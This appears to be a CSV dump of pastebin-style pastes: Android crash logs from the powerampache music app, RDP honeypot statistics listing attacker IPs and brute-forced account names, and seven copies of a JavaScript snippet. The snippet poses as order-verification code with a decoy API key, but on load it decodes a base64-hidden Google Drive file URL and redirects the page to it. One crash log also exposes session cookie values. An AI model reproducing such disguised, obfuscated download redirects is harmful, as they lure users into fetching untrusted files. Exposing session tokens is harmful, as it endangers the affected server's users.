id,title,username,language,date,content
iCNQa9Cu,2025-05-28T19:19:32.575586,powerampache,PHP,Wednesday 28th of May 2025 07:19:33 PM CDT,"1.01-80-play (80) - DB: 83
luci.sixsixsix.powerampache2.domain.errors.MusicException: {""errorAction"":""genre_songs"",""errorCode"":""4704"",""errorMessage"":""Not Found: 116"",""errorType"":""filter""}
	at luci.sixsixsix.powerampache2.data.SongsRepositoryImpl$getSongsByGenre$2.invokeSuspend(SongsRepositoryImpl.kt:397)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:104)
	at android.os.Handler.handleCallback(Handler.java:959)
	at android.os.Handler.dispatchMessage(Handler.java:100)
	at android.os.Looper.loopOnce(Looper.java:257)
	at android.os.Looper.loop(Looper.java:342)
	at android.app.ActivityThread.main(ActivityThread.java:9579)
	at java.lang.reflect.Method.invoke(Native Method)
	at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:619)
	at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:929)

getArtists() - {""errorAction"":""genre_songs"",""errorCode"":""4704"",""errorMessage"":""Not Found: 116"",""errorType"":""filter""}"
nMQ8CNXU,2025-05-28_stats.json,rdp_snitch,JSON,Wednesday 28th of May 2025 07:18:10 PM CDT,"{
  ""ip"": {
    ""24.173.30.170"": 6801,
    ""128.199.168.88"": 5724,
    ""143.198.221.164"": 537,
    ""157.245.159.1"": 339,
    ""123.103.219.78"": 51,
    ""80.94.95.198"": 54,
    ""88.214.25.121"": 6,
    ""91.238.181.94"": 6,
    ""194.187.177.117"": 3,
    ""71.82.170.60"": 18,
    ""92.63.197.197"": 12,
    ""66.228.46.123"": 12,
    ""205.210.31.48"": 9,
    ""45.56.112.145"": 3,
    ""157.245.150.219"": 3,
    ""92.63.197.23"": 33,
    ""167.172.153.78"": 6,
    ""138.68.188.52"": 3,
    ""194.0.234.34"": 6,
    ""205.210.31.67"": 9,
    ""107.173.58.226"": 6,
    ""78.142.18.92"": 3,
    ""134.122.51.9"": 36,
    ""82.147.88.139"": 6,
    ""103.15.222.151"": 6,
    ""185.196.220.41"": 9,
    ""111.170.152.113"": 9,
    ""195.178.110.98"": 6,
    ""147.185.132.58"": 9,
    ""165.154.182.72"": 3,
    ""165.232.170.129"": 4395,
    ""91.238.181.96"": 6,
    ""198.235.24.184"": 9,
    ""88.214.25.123"": 6
  },
  ""asn"": {
    ""AS11427"": 6801,
    ""AS14061"": 11043,
    ""AS4826"": 51,
    ""AS204428"": 54,
    ""AS35042"": 12,
    ""AS49434"": 12,
    ""AS208843"": 3,
    ""AS20115"": 18,
    ""AS210848"": 45,
    ""AS63949"": 15,
    ""AS396982"": 36,
    ""AS214295"": 6,
    ""AS20278"": 6,
    ""AS208046"": 12,
    ""AS211860"": 6,
    ""AS149137"": 6,
    ""AS151185"": 9,
    ""AS48090"": 6,
    ""AS135377"": 3
  },
  ""isp"": {
    ""Charter Communications Inc"": 6801,
    ""DigitalOcean, LLC"": 11043,
    ""Vocus PTY LTD"": 51,
    ""SS-Net"": 54,
    ""NOC EMAIL: noc@one-host.net"": 12,
    ""Datacenter location PAR1 France"": 12,
    ""Alpha Strike Labs GmbH"": 3,
    ""Charter Communications"": 18,
    ""Telkom Internet LTD"": 45,
    ""Akamai Technologies, Inc."": 15,
    ""Google LLC"": 36,
    ""Skynet Network LTD"": 6,
    ""Nexeon Technologies, Inc."": 6,
    ""ColocationX Ltd."": 12,
    ""Nerushenko Vyacheslav Nikolaevich"": 6,
    ""TAN Thanh AN International Trade Development Company Limited"": 6,
    ""China Telecom"": 9,
    ""Techoff SRV Limited"": 6,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3
  },
  ""org"": {
    ""Spectrum"": 6819,
    ""DigitalOcean, LLC"": 11043,
    ""Vocus Communications"": 51,
    ""Unmanaged LTD"": 54,
    ""ThinkTech Technology Industrial CO. Limited"": 24,
    ""Alpha Strike Labs GmbH"": 3,
    ""Korotkij Denis Aleksandrovich"": 45,
    ""Linode"": 15,
    ""Palo Alto Networks, Inc"": 36,
    ""Skynet Network LTD"": 6,
    ""ColoCrossing"": 6,
    ""ColocationX Ltd"": 12,
    ""Nerushenko Vyacheslav Nikolaevich"": 6,
    ""TANTHANHAN"": 6,
    ""Chinanet HB"": 9,
    ""Techoff SRV Limited"": 6,
    ""Ucloud Information Technology (hk) Limited"": 3
  },
  ""regionName"": {
    ""Texas"": 6801,
    ""South West"": 10998,
    ""Western Australia"": 51,
    ""Sofia-Capital"": 54,
    ""Kowloon City"": 12,
    ""\u00cele-de-France"": 12,
    ""State of Berlin"": 3,
    ""Wisconsin"": 18,
    ""North Holland"": 84,
    ""New Jersey"": 18,
    ""California"": 39,
    ""Georgia"": 3,
    ""England"": 9,
    ""New York"": 6,
    ""Krasnoyarsk Krai"": 6,
    ""Hanoi"": 6,
    ""Virginia"": 9,
    ""Hubei"": 9,
    ""Andorra la Vella"": 6
  },
  ""country"": {
    ""United States"": 6894,
    ""Singapore"": 10998,
    ""Australia"": 51,
    ""Bulgaria"": 54,
    ""Hong Kong"": 12,
    ""France"": 12,
    ""Germany"": 3,
    ""The Netherlands"": 84,
    ""United Kingdom"": 9,
    ""Russia"": 6,
    ""Vietnam"": 6,
    ""China"": 9,
    ""Andorra"": 6
  },
  ""account"": {
    ""hello"": 17856,
    ""142.93.8.59"": 126,
    ""Test"": 36,
    ""user"": 3,
    ""152s6omg"": 12,
    ""yczeDBqhx"": 3,
    ""DuvwKL"": 3,
    ""bexGkd"": 3,
    ""beio"": 3,
    ""Administr"": 60,
    ""REkuHSOwW"": 3,
    ""acHews"": 3,
    ""XJWMXu"": 3,
    ""Domain"": 9,
    ""FBcrZVMET"": 3,
    ""FqXtkU"": 3,
    ""pBFZzb"": 3,
    ""Administrator"": 3,
    ""WbqnkaBFR"": 3,
    ""DCXOSk"": 3,
    ""bNTXIm"": 3
  },
  ""keyboard"": {
    ""Unknown"": 18144
  },
  ""client_build"": {
    ""Unknown"": 18144
  },
  ""client_name"": {
    ""Unknown"": 18144
  },
  ""ip_type"": {
    ""Unknown"": 7029,
    ""hosting"": 11109,
    ""proxy"": 6
  }
}"
fZW57bHF,2025-05-28_stats.json,rdp_snitch,JSON,Wednesday 28th of May 2025 07:16:14 PM CDT,"{
  ""ip"": {
    ""24.173.30.170"": 4534,
    ""128.199.168.88"": 3816,
    ""143.198.221.164"": 358,
    ""157.245.159.1"": 226,
    ""123.103.219.78"": 34,
    ""80.94.95.198"": 36,
    ""88.214.25.121"": 4,
    ""91.238.181.94"": 4,
    ""194.187.177.117"": 2,
    ""71.82.170.60"": 12,
    ""92.63.197.197"": 8,
    ""66.228.46.123"": 8,
    ""205.210.31.48"": 6,
    ""45.56.112.145"": 2,
    ""157.245.150.219"": 2,
    ""92.63.197.23"": 22,
    ""167.172.153.78"": 4,
    ""138.68.188.52"": 2,
    ""194.0.234.34"": 4,
    ""205.210.31.67"": 6,
    ""107.173.58.226"": 4,
    ""78.142.18.92"": 2,
    ""134.122.51.9"": 24,
    ""82.147.88.139"": 4,
    ""103.15.222.151"": 4,
    ""185.196.220.41"": 6,
    ""111.170.152.113"": 6,
    ""195.178.110.98"": 4,
    ""147.185.132.58"": 6,
    ""165.154.182.72"": 2,
    ""165.232.170.129"": 2930,
    ""91.238.181.96"": 4,
    ""198.235.24.184"": 6,
    ""88.214.25.123"": 4
  },
  ""asn"": {
    ""AS11427"": 4534,
    ""AS14061"": 7362,
    ""AS4826"": 34,
    ""AS204428"": 36,
    ""AS35042"": 8,
    ""AS49434"": 8,
    ""AS208843"": 2,
    ""AS20115"": 12,
    ""AS210848"": 30,
    ""AS63949"": 10,
    ""AS396982"": 24,
    ""AS214295"": 4,
    ""AS20278"": 4,
    ""AS208046"": 8,
    ""AS211860"": 4,
    ""AS149137"": 4,
    ""AS151185"": 6,
    ""AS48090"": 4,
    ""AS135377"": 2
  },
  ""isp"": {
    ""Charter Communications Inc"": 4534,
    ""DigitalOcean, LLC"": 7362,
    ""Vocus PTY LTD"": 34,
    ""SS-Net"": 36,
    ""NOC EMAIL: noc@one-host.net"": 8,
    ""Datacenter location PAR1 France"": 8,
    ""Alpha Strike Labs GmbH"": 2,
    ""Charter Communications"": 12,
    ""Telkom Internet LTD"": 30,
    ""Akamai Technologies, Inc."": 10,
    ""Google LLC"": 24,
    ""Skynet Network LTD"": 4,
    ""Nexeon Technologies, Inc."": 4,
    ""ColocationX Ltd."": 8,
    ""Nerushenko Vyacheslav Nikolaevich"": 4,
    ""TAN Thanh AN International Trade Development Company Limited"": 4,
    ""China Telecom"": 6,
    ""Techoff SRV Limited"": 4,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2
  },
  ""org"": {
    ""Spectrum"": 4546,
    ""DigitalOcean, LLC"": 7362,
    ""Vocus Communications"": 34,
    ""Unmanaged LTD"": 36,
    ""ThinkTech Technology Industrial CO. Limited"": 16,
    ""Alpha Strike Labs GmbH"": 2,
    ""Korotkij Denis Aleksandrovich"": 30,
    ""Linode"": 10,
    ""Palo Alto Networks, Inc"": 24,
    ""Skynet Network LTD"": 4,
    ""ColoCrossing"": 4,
    ""ColocationX Ltd"": 8,
    ""Nerushenko Vyacheslav Nikolaevich"": 4,
    ""TANTHANHAN"": 4,
    ""Chinanet HB"": 6,
    ""Techoff SRV Limited"": 4,
    ""Ucloud Information Technology (hk) Limited"": 2
  },
  ""regionName"": {
    ""Texas"": 4534,
    ""South West"": 7332,
    ""Western Australia"": 34,
    ""Sofia-Capital"": 36,
    ""Kowloon City"": 8,
    ""\u00cele-de-France"": 8,
    ""State of Berlin"": 2,
    ""Wisconsin"": 12,
    ""North Holland"": 56,
    ""New Jersey"": 12,
    ""California"": 26,
    ""Georgia"": 2,
    ""England"": 6,
    ""New York"": 4,
    ""Krasnoyarsk Krai"": 4,
    ""Hanoi"": 4,
    ""Virginia"": 6,
    ""Hubei"": 6,
    ""Andorra la Vella"": 4
  },
  ""country"": {
    ""United States"": 4596,
    ""Singapore"": 7332,
    ""Australia"": 34,
    ""Bulgaria"": 36,
    ""Hong Kong"": 8,
    ""France"": 8,
    ""Germany"": 2,
    ""The Netherlands"": 56,
    ""United Kingdom"": 6,
    ""Russia"": 4,
    ""Vietnam"": 4,
    ""China"": 6,
    ""Andorra"": 4
  },
  ""account"": {
    ""hello"": 11904,
    ""142.93.8.59"": 84,
    ""Test"": 24,
    ""user"": 2,
    ""152s6omg"": 8,
    ""yczeDBqhx"": 2,
    ""DuvwKL"": 2,
    ""bexGkd"": 2,
    ""beio"": 2,
    ""Administr"": 40,
    ""REkuHSOwW"": 2,
    ""acHews"": 2,
    ""XJWMXu"": 2,
    ""Domain"": 6,
    ""FBcrZVMET"": 2,
    ""FqXtkU"": 2,
    ""pBFZzb"": 2,
    ""Administrator"": 2,
    ""WbqnkaBFR"": 2,
    ""DCXOSk"": 2,
    ""bNTXIm"": 2
  },
  ""keyboard"": {
    ""Unknown"": 12096
  },
  ""client_build"": {
    ""Unknown"": 12096
  },
  ""client_name"": {
    ""Unknown"": 12096
  },
  ""ip_type"": {
    ""Unknown"": 4686,
    ""hosting"": 7406,
    ""proxy"": 4
  }
}"
9n0wXuWk,2025-05-28_stats.json,rdp_snitch,JSON,Wednesday 28th of May 2025 07:15:09 PM CDT,"{
  ""ip"": {
    ""24.173.30.170"": 2267,
    ""128.199.168.88"": 1908,
    ""143.198.221.164"": 179,
    ""157.245.159.1"": 113,
    ""123.103.219.78"": 17,
    ""80.94.95.198"": 18,
    ""88.214.25.121"": 2,
    ""91.238.181.94"": 2,
    ""194.187.177.117"": 1,
    ""71.82.170.60"": 6,
    ""92.63.197.197"": 4,
    ""66.228.46.123"": 4,
    ""205.210.31.48"": 3,
    ""45.56.112.145"": 1,
    ""157.245.150.219"": 1,
    ""92.63.197.23"": 11,
    ""167.172.153.78"": 2,
    ""138.68.188.52"": 1,
    ""194.0.234.34"": 2,
    ""205.210.31.67"": 3,
    ""107.173.58.226"": 2,
    ""78.142.18.92"": 1,
    ""134.122.51.9"": 12,
    ""82.147.88.139"": 2,
    ""103.15.222.151"": 2,
    ""185.196.220.41"": 3,
    ""111.170.152.113"": 3,
    ""195.178.110.98"": 2,
    ""147.185.132.58"": 3,
    ""165.154.182.72"": 1,
    ""165.232.170.129"": 1465,
    ""91.238.181.96"": 2,
    ""198.235.24.184"": 3,
    ""88.214.25.123"": 2
  },
  ""asn"": {
    ""AS11427"": 2267,
    ""AS14061"": 3681,
    ""AS4826"": 17,
    ""AS204428"": 18,
    ""AS35042"": 4,
    ""AS49434"": 4,
    ""AS208843"": 1,
    ""AS20115"": 6,
    ""AS210848"": 15,
    ""AS63949"": 5,
    ""AS396982"": 12,
    ""AS214295"": 2,
    ""AS20278"": 2,
    ""AS208046"": 4,
    ""AS211860"": 2,
    ""AS149137"": 2,
    ""AS151185"": 3,
    ""AS48090"": 2,
    ""AS135377"": 1
  },
  ""isp"": {
    ""Charter Communications Inc"": 2267,
    ""DigitalOcean, LLC"": 3681,
    ""Vocus PTY LTD"": 17,
    ""SS-Net"": 18,
    ""NOC EMAIL: noc@one-host.net"": 4,
    ""Datacenter location PAR1 France"": 4,
    ""Alpha Strike Labs GmbH"": 1,
    ""Charter Communications"": 6,
    ""Telkom Internet LTD"": 15,
    ""Akamai Technologies, Inc."": 5,
    ""Google LLC"": 12,
    ""Skynet Network LTD"": 2,
    ""Nexeon Technologies, Inc."": 2,
    ""ColocationX Ltd."": 4,
    ""Nerushenko Vyacheslav Nikolaevich"": 2,
    ""TAN Thanh AN International Trade Development Company Limited"": 2,
    ""China Telecom"": 3,
    ""Techoff SRV Limited"": 2,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1
  },
  ""org"": {
    ""Spectrum"": 2273,
    ""DigitalOcean, LLC"": 3681,
    ""Vocus Communications"": 17,
    ""Unmanaged LTD"": 18,
    ""ThinkTech Technology Industrial CO. Limited"": 8,
    ""Alpha Strike Labs GmbH"": 1,
    ""Korotkij Denis Aleksandrovich"": 15,
    ""Linode"": 5,
    ""Palo Alto Networks, Inc"": 12,
    ""Skynet Network LTD"": 2,
    ""ColoCrossing"": 2,
    ""ColocationX Ltd"": 4,
    ""Nerushenko Vyacheslav Nikolaevich"": 2,
    ""TANTHANHAN"": 2,
    ""Chinanet HB"": 3,
    ""Techoff SRV Limited"": 2,
    ""Ucloud Information Technology (hk) Limited"": 1
  },
  ""regionName"": {
    ""Texas"": 2267,
    ""South West"": 3666,
    ""Western Australia"": 17,
    ""Sofia-Capital"": 18,
    ""Kowloon City"": 4,
    ""\u00cele-de-France"": 4,
    ""State of Berlin"": 1,
    ""Wisconsin"": 6,
    ""North Holland"": 28,
    ""New Jersey"": 6,
    ""California"": 13,
    ""Georgia"": 1,
    ""England"": 3,
    ""New York"": 2,
    ""Krasnoyarsk Krai"": 2,
    ""Hanoi"": 2,
    ""Virginia"": 3,
    ""Hubei"": 3,
    ""Andorra la Vella"": 2
  },
  ""country"": {
    ""United States"": 2298,
    ""Singapore"": 3666,
    ""Australia"": 17,
    ""Bulgaria"": 18,
    ""Hong Kong"": 4,
    ""France"": 4,
    ""Germany"": 1,
    ""The Netherlands"": 28,
    ""United Kingdom"": 3,
    ""Russia"": 2,
    ""Vietnam"": 2,
    ""China"": 3,
    ""Andorra"": 2
  },
  ""account"": {
    ""hello"": 5952,
    ""142.93.8.59"": 42,
    ""Test"": 12,
    ""user"": 1,
    ""152s6omg"": 4,
    ""yczeDBqhx"": 1,
    ""DuvwKL"": 1,
    ""bexGkd"": 1,
    ""beio"": 1,
    ""Administr"": 20,
    ""REkuHSOwW"": 1,
    ""acHews"": 1,
    ""XJWMXu"": 1,
    ""Domain"": 3,
    ""FBcrZVMET"": 1,
    ""FqXtkU"": 1,
    ""pBFZzb"": 1,
    ""Administrator"": 1,
    ""WbqnkaBFR"": 1,
    ""DCXOSk"": 1,
    ""bNTXIm"": 1
  },
  ""keyboard"": {
    ""Unknown"": 6048
  },
  ""client_build"": {
    ""Unknown"": 6048
  },
  ""client_name"": {
    ""Unknown"": 6048
  },
  ""ip_type"": {
    ""Unknown"": 2343,
    ""hosting"": 3703,
    ""proxy"": 2
  }
}"
YPJ9H2Nj,Products.js,wompwompretigga,JavaScript,Wednesday 28th of May 2025 07:09:37 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/40958/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
gWjmmTLD,Order.js,wompwompretigga,JavaScript,Wednesday 28th of May 2025 07:04:13 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/42079/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
bdtLL2zL,Market.js,wompwompretigga,JavaScript,Wednesday 28th of May 2025 06:58:50 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/06863/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
66BufSYa,Untitled,wompwompretigga,JavaScript,Wednesday 28th of May 2025 06:53:13 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/85307/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
gm7Ap450,Untitled,wompwompretigga,JavaScript,Wednesday 28th of May 2025 06:50:49 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/92785/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
PeaXcSNt,Market.js,wompwompretigga,JavaScript,Wednesday 28th of May 2025 06:39:04 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/26839/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
wPy11T73,Untitled,wompwompretigga,JavaScript,Wednesday 28th of May 2025 06:33:40 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/10219/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
iL7e5Ha1,2025-05-28T18:02:18.405967,powerampache,PHP,Wednesday 28th of May 2025 06:02:19 PM CDT,"1.01-80-play (80) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""timeout"" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:644)
	at java.lang.Thread.run(Thread.java:1012)

scrobble() - cannot load data HttpException {""code"":404,""message"":""{ \""exception\"" : \""timeout\"" }"",""detailMessage"":""HTTP 404 { \""exception\"" : \""timeout\"" }"",""stackTrace"":[]}"
GxwgpHSd,2025-05-29T07:57:38.498878,powerampache,PHP,Wednesday 28th of May 2025 05:57:40 PM CDT,"1.01-80-play (80) - DB: 83
androidx.media3.datasource.HttpDataSource$InvalidResponseCodeException: Response code: 404
	at androidx.media3.datasource.DefaultHttpDataSource.open(DefaultHttpDataSource.java:401)
	at androidx.media3.datasource.DefaultDataSource.open(DefaultDataSource.java:275)
	at androidx.media3.datasource.TeeDataSource.open(TeeDataSource.java:54)
	at androidx.media3.datasource.cache.CacheDataSource.openNextSource(CacheDataSource.java:802)
	at androidx.media3.datasource.cache.CacheDataSource.open(CacheDataSource.java:615)
	at androidx.media3.datasource.StatsDataSource.open(StatsDataSource.java:88)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1109)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:453)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:644)
	at java.lang.Thread.run(Thread.java:1012)

onPlayerError Invalid response code 404 - Not Found - HttpDataSource.InvalidResponseCodeException 
onPlayerError Invalid response code 404 - Not Found
 {""headerFields"":{""null"":[""HTTP/1.1 404 Not Found""],""Cache-Control"":[""no-cache, no-store, must-revalidate""],""Connection"":[""Keep-Alive""],""Content-Length"":[""1006""],""Content-Security-Policy"":[""default-src \u0027none\u0027;base-uri \u0027none\u0027;manifest-src \u0027self\u0027;frame-ancestors \u0027none\u0027""],""Content-Type"":[""application/json; charset\u003dutf-8""],""Date"":[""Wed, 28 May 2025 22:57:35 GMT""],""Feature-Policy"":[""autoplay \u0027none\u0027;camera \u0027none\u0027;fullscreen \u0027none\u0027;geolocation \u0027none\u0027;microphone \u0027none\u0027;payment \u0027none\u0027""],""Keep-Alive"":[""timeout\u003d5, max\u003d100""],""Referrer-Policy"":[""no-referrer""],""Server"":[""Apache/2.4.62 (AlmaLinux) OpenSSL/3.2.2""],""Set-Cookie"":[""oc_sessionPassphrase\u003dTIlsGepuInXsVWTTyk7Hko5YBgXxghnbaBuHojyABMSbBAkAF13UwOqFOjzsv9Lq8KEEgmhAs7c%2BR93WqB2nObhH7T6V8uQ0chWYAc75H7TwgyAzlyFIgrXQs0IsdetN; path\u003d/; secure; HttpOnly; SameSite\u003dLax"",""__Host-nc_sameSiteCookielax\u003dtrue; path\u003d/; httponly;secure; expires\u003dFri, 31-Dec-2100 23:59:59 GMT; SameSite\u003dlax"",""__Host-nc_sameSiteCookiestrict\u003dtrue; path\u003d/; httponly;secure; expires\u003dFri, 31-Dec-2100 23:59:59 GMT; SameSite\u003dstrict"",""ochcpj79q18g\u003djm1kjbu3ud2ipi4ig1t34ostdb; path\u003d/; secure; HttpOnly; SameSite\u003dLax""],""Strict-Transport-Security"":[""max-age\u003d15768000""],""Vary"":[""Accept-Encoding""],""X-Android-Received-Millis"":[""1748473054734""],""X-Android-Response-Source"":[""NETWORK 404""],""X-Android-Selected-Protocol"":[""http/1.1""],""X-Android-Sent-Millis"":[""1748473054520""],""X-Content-Type-Options"":[""nosniff""],""X-Frame-Options"":[""SAMEORIGIN""],""X-Permitted-Cross-Domain-Policies"":[""none""],""X-Powered-By"":[""PHP/8.3.21""],""X-Request-Id"":[""aDeU3wJbnWE5NfOOg3sIZAAAAI8""],""X-Robots-Tag"":[""noindex, nofollow""],""X-XSS-Protection"":[""1; 